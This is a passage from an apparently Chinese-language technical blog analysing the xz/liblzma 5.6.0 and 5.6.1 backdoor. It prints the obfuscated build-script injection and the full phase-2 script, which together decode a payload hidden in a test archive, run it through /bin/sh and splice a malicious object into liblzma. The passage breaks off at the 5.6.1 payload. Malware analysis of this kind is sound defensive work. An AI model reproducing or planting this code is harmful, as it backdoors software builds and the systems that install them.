class="hljs-comment">###Hello####</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Z.hj</span><br>eval `grep ^srcdir= config.status`<br>if test -f ../../config.status;then<br>eval `grep ^srcdir= ../../config.status`<br>srcdir=&quot;../../$srcdir&quot;<br>fi<br>export i=&quot;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)&quot;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">###World####</span></span><br>`<br></code></pre></td></tr></table></figure><p><strong>5.6.1</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_config=<span class="hljs-string">&#x27;sed \&quot;r\n\&quot; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#x27;</span></span><br><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_config=`</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">###Hello####</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">�$�</span><br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>[ ! $(uname) = &quot;Linux&quot; ] &amp;&amp; exit 0<br>eval `grep ^srcdir= config.status`<br>if test -f ../../config.status;then<br>eval `grep ^srcdir= ../../config.status`<br>srcdir=&quot;../../$srcdir&quot;<br>fi<br>export i=&quot;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&quot;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr &quot;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">###World####</span></span><br>`<br></code></pre></td></tr></table></figure><p>這兩個版本的payload差不多，不過5.6.1版本會確認是否在Linux上編譯，而且確認了5次，可能是為了增加更改的量，讓commit看起來更正常</p><p>另一個不同的點是變數<code>i</code>的值不同，偏移量有所區別</p><p><code>i</code>的指令會丟棄前1024bytes，輸出2048bytes，再次丟棄前1024bytes，輸出2048bytes，這樣重複16次，最後丟棄前1024bytes，輸出724bytes(5.6.0)/939bytes(5.6.1)</p><p>後面的部分則是將第二個包含惡意Payload的測試檔案(<code>tests/files/good-large_compressed.lzma</code>)解壓縮，並對輸出執行<code>i</code>的指令，擷取尾部31265bytes(5.6.0)/31233bytes(5.6.1)，使用tr替換字元，再次進行一次解壓縮，得到phase2 payload，並將其執行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh<br></code></pre></td></tr></table></figure>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-364a092e" role="button" aria-expanded="false" aria-controls="collapse-364a092e">        <div class="fold-arrow">▶</div>phase2 payload      </div>      <div class="fold-collapse collapse" id="collapse-364a092e">        <div class="fold-content">          <p><a href="5.6.0-phase2-payload.txt"><strong>5.6.0-phase2-payload</strong></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><code class="hljs shell">P=&quot;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&quot;<br>C=&quot;pic_flag=\&quot; $P\&quot;&quot;<br>O=&quot;^pic_flag=\&quot; -fPIC -DPIC\&quot;$&quot;<br>R=&quot;is_arch_extension_supported&quot;<br>x=&quot;__get_cpuid(&quot;<br>p=&quot;good-large_compressed.lzma&quot;<br>U=&quot;bad-3-corrupt_lzma2.xz&quot;<br>eval $zrKcVq<br>if test -f config.status; then<br>eval $zrKcSS<br>eval `grep ^LD=\&#x27;\/ config.status`<br>eval `grep ^CC=\&#x27; config.status`<br>eval `grep ^GCC=\&#x27; config.status`<br>eval `grep ^srcdir=\&#x27; config.status`<br>eval `grep ^build=\&#x27;x86_64 config.status`<br>eval `grep ^enable_shared=\&#x27;yes\&#x27; config.status`<br>eval `grep ^enable_static=\&#x27; config.status`<br>eval `grep ^gl_path_map=\&#x27; config.status`<br>eval $zrKccj<br>if ! grep -qs &#x27;\[&quot;HAVE_FUNC_ATTRIBUTE_IFUNC&quot;\]=&quot; 1&quot;&#x27; config.status &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if ! grep -qs &#x27;define HAVE_FUNC_ATTRIBUTE_IFUNC 1&#x27; config.h &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if test &quot;x$enable_shared&quot; != &quot;xyes&quot;;then<br>exit 0<br>fi<br>if ! (echo &quot;$build&quot; | grep -Eq &quot;^x86_64&quot; &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo &quot;$build&quot; | grep -Eq &quot;linux-gnu$&quot; &gt; /dev/null 2&gt;&amp;1);then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R()&quot; $srcdir/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;&amp;1; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R()&quot; $srcdir/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;&amp;1; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R&quot; $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$x&quot; $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then<br>exit 0<br>fi<br>if test &quot;x$GCC&quot; != &#x27;xyes&#x27; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if test &quot;x$CC&quot; != &#x27;xgcc&#x27; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>LDv=$LD&quot; -v&quot;<br>if ! $LDv 2&gt;&amp;1 | grep -qs &#x27;GNU ld&#x27; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if ! test -f &quot;$srcdir/tests/files/$p&quot; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if ! test -f &quot;$srcdir/tests/files/$U&quot; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if test -f &quot;$srcdir/debian/rules&quot; || test &quot;x$RPM_ARCH&quot; = &quot;xx86_64&quot;;then<br>eval $zrKcst<br>j=&quot;^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4&quot;<br>if ! grep -qs &quot;$j&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>z=&quot;^am__uninstall_files_from_dir = &#123;&quot;<br>if ! grep -qs &quot;$z&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>w=&quot;^am__install_max =&quot;<br>if ! grep -qs &quot;$w&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>E=$z<br>if ! grep -qs &quot;$E&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>Q=&quot;^am__vpath_adj_setup =&quot;<br>if ! grep -qs &quot;$Q&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>M=&quot;^am__include = include&quot;<br>if ! grep -qs &quot;$M&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>L=&quot;^all: all-recursive$&quot;<br>if ! grep -qs &quot;$L&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>m=&quot;^LTLIBRARIES = \$(lib_LTLIBRARIES)&quot;<br>if ! grep -qs &quot;$m&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>u=&quot;AM_V_CCLD = \$(am__v_CCLD_\$(V))&quot;<br>if ! grep -qs &quot;$u&quot; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if ! grep -qs &quot;$O&quot; libtool &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>eval $zrKcTy<br>b=&quot;am__test = $U&quot;<br>sed -i &quot;/$j/i$b&quot; src/liblzma/Makefile || true<br>d=`echo $gl_path_map | sed &#x27;s/\\\/\\\\\\\\/g&#x27;`<br>b=&quot;am__strip_prefix = $d&quot;<br>sed -i &quot;/$w/i$b&quot; src/liblzma/Makefile || true<br>b=&quot;am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)&quot;<br>sed -i &quot;/$E/i$b&quot; src/liblzma/Makefile || true<br>b=&quot;\$(top_srcdir)/tests/files/\$(am__test)&quot;<br>s=&quot;am__test_dir=$b&quot;<br>sed -i &quot;/$Q/i$s&quot; src/liblzma/Makefile || true<br>h=&quot;-Wl,--sort-section=name,-X&quot;<br>if ! echo &quot;$LDFLAGS&quot; | grep -qs -e &quot;-z,now&quot; -e &quot;-z -Wl,now&quot; &gt; /dev/null 2&gt;&amp;1;then<br>h=$h&quot;,-z,now&quot;<br>fi<br>j=&quot;liblzma_la_LDFLAGS += $h&quot;<br>sed -i &quot;/$L/i$j&quot; src/liblzma/Makefile || true<br>sed -i &quot;s/$O/$C/g&quot; libtool || true<br>k=&quot;AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))&quot;<br>sed -i &quot;s/$u/$k/&quot; src/liblzma/Makefile || true<br>l=&quot;LTDEPS=&#x27;\$(lib_LTDEPS)&#x27;; \\\\\n\<br>    export top_srcdir=&#x27;\$(top_srcdir)&#x27;; \\\\\n\<br>    export CC=&#x27;\$(CC)&#x27;; \\\\\n\<br>    export DEFS=&#x27;\$(DEFS)&#x27;; \\\\\n\<br>    export DEFAULT_INCLUDES=&#x27;\$(DEFAULT_INCLUDES)&#x27;; \\\\\n\<br>    export INCLUDES=&#x27;\$(INCLUDES)&#x27;; \\\\\n\<br>    export liblzma_la_CPPFLAGS=&#x27;\$(liblzma_la_CPPFLAGS)&#x27;; \\\\\n\<br>    export CPPFLAGS=&#x27;\$(CPPFLAGS)&#x27;; \\\\\n\<br>    export AM_CFLAGS=&#x27;\$(AM_CFLAGS)&#x27;; \\\\\n\<br>    export CFLAGS=&#x27;\$(CFLAGS)&#x27;; \\\\\n\<br>    export AM_V_CCLD=&#x27;\$(am__v_CCLD_\$(V))&#x27;; \\\\\n\<br>    export liblzma_la_LINK=&#x27;\$(liblzma_la_LINK)&#x27;; \\\\\n\<br>    export libdir=&#x27;\$(libdir)&#x27;; \\\\\n\<br>    export liblzma_la_OBJECTS=&#x27;\$(liblzma_la_OBJECTS)&#x27;; \\\\\n\<br>    export liblzma_la_LIBADD=&#x27;\$(liblzma_la_LIBADD)&#x27;; \\\\\n\<br>sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1&quot;;<br>sed -i &quot;/$m/i$l&quot; src/liblzma/Makefile || true<br>eval $zrKcHD<br>fi<br>elif (test -f .libs/liblzma_la-crc64_fast.o) &amp;&amp; (test -f .libs/liblzma_la-crc32_fast.o); then<br>eval $zrKcKQ<br>if ! grep -qs &quot;$R()&quot; $top_srcdir/src/liblzma/check/crc64_fast.c; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R()&quot; $top_srcdir/src/liblzma/check/crc32_fast.c; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$R&quot; $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$x&quot; $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then<br>exit 0<br>fi<br>if ! grep -qs &quot;$C&quot; ../../libtool; then<br>exit 0<br>fi<br>if ! echo $liblzma_la_LINK | grep -qs -e &quot;-z,now&quot; -e &quot;-z -Wl,now&quot; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>if echo $liblzma_la_LINK | grep -qs -e &quot;lazy&quot; &gt; /dev/null 2&gt;&amp;1;then<br>exit 0<br>fi<br>N=0<br>W=0<br>Y=`grep &quot;dnl Convert it to C string syntax.&quot; $top_srcdir/m4/gettext.m4`<br>eval $zrKcjv<br>if test -z &quot;$Y&quot;; then<br>N=0<br>W=88792<br>else<br>N=88792<br>W=0<br>fi<br>xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed &quot;s/\(.\)/\1\n/g&quot; | LC_ALL=C awk &#x27;BEGIN&#123;FS=&quot;\n&quot;;RS=&quot;\n&quot;;ORS=&quot;&quot;;m=256;for(i=0;i&lt;m;i++)&#123;t[sprintf(&quot;x%c&quot;,i)]=i;c[i]=((i*7)+5)%m;&#125;i=0;j=0;for(l=0;l&lt;4096;l++)&#123;i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;&#125;&#125;&#123;v=t[&quot;x&quot; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &quot;%c&quot;,(v+k)%m&#125;&#x27; | xz -dc --single-stream | ((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o || true<br>if ! test -f liblzma_la-crc64-fast.o; then<br>exit 0<br>fi<br>cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true<br>V=&#x27;#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) &#123; int success = 1; uint32_t r[4]; success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19); return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; &#125;\n#else\n#define _is_arch_extension_supported is_arch_extension_supported&#x27;<br>eval $yosA<br>if sed &quot;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&quot; $top_srcdir/src/liblzma/check/crc64_fast.c | \<br>sed &quot;/include \&quot;crc_x86_clmul.h\&quot;/a \\$V&quot; | \<br>sed &quot;1i # 0 \&quot;$top_srcdir/src/liblzma/check/crc64_fast.c\&quot;&quot; 2&gt;/dev/null | \<br><span class="hljs-meta prompt_">$</span><span class="language-bash">CC <span class="hljs-variable">$DEFS</span> <span class="hljs-variable">$DEFAULT_INCLUDES</span> <span class="hljs-variable">$INCLUDES</span> <span class="hljs-variable">$liblzma_la_CPPFLAGS</span> <span class="hljs-variable">$CPPFLAGS</span> <span class="hljs-variable">$AM_CFLAGS</span> <span class="hljs-variable">$CFLAGS</span> -r liblzma_la-crc64-fast.o -x c -  <span class="hljs-variable">$P</span> -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null; <span class="hljs-keyword">then</span></span><br>cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true<br>eval $BPep<br>if sed &quot;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&quot; $top_srcdir/src/liblzma/check/crc32_fast.c | \<br>sed &quot;/include \&quot;crc32_arm64.h\&quot;/a \\$V&quot; | \<br>sed &quot;1i # 0 \&quot;$top_srcdir/src/liblzma/check/crc32_fast.c\&quot;&quot; 2&gt;/dev/null | \<br><span class="hljs-meta prompt_">$</span><span class="language-bash">CC <span class="hljs-variable">$DEFS</span> <span class="hljs-variable">$DEFAULT_INCLUDES</span> <span class="hljs-variable">$INCLUDES</span> <span class="hljs-variable">$liblzma_la_CPPFLAGS</span> <span class="hljs-variable">$CPPFLAGS</span> <span class="hljs-variable">$AM_CFLAGS</span> <span class="hljs-variable">$CFLAGS</span> -r -x c -  <span class="hljs-variable">$P</span> -o .libs/liblzma_la-crc32_fast.o; <span class="hljs-keyword">then</span></span><br>eval $RgYB<br>if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then<br>if test ! -f .libs/liblzma.so; then<br>mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true<br>mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true<br>fi<br>rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true<br>else<br>mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true<br>mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true<br>fi<br>rm -f .libs/liblzma_la-crc32-fast.o || true<br>rm -f .libs/liblzma_la-crc64-fast.o || true<br>else<br>mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true<br>mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true<br>fi<br>else<br>mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true<br>fi<br>rm -f liblzma_la-crc64-fast.o || true<br>fi<br>eval $DHLd<br></code></pre></td></tr></table></figure><p><a href="5.6.1-phase2-payload.txt"><strong>5.6.1-phase2-payload</strong></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span 